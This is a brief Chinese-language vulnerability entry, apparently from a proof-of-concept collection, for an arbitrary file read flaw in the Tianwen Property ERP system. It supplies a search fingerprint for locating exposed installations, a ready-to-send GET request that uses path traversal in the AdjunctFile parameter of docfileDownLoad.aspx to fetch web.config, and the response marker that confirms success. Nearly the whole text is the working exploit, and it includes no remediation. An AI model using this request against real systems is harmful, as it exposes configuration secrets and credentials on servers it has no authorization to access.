# 天问物业ERP系统任意文件读取漏洞

天问物业ERP系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="天问物业ERP系统"`
- **请求**：`GET /HM/M_Main/WorkGeneral/docfileDownLoad.aspx?AdjunctFile=../web.config HTTP/1.1`
- **响应特征**：200 configuration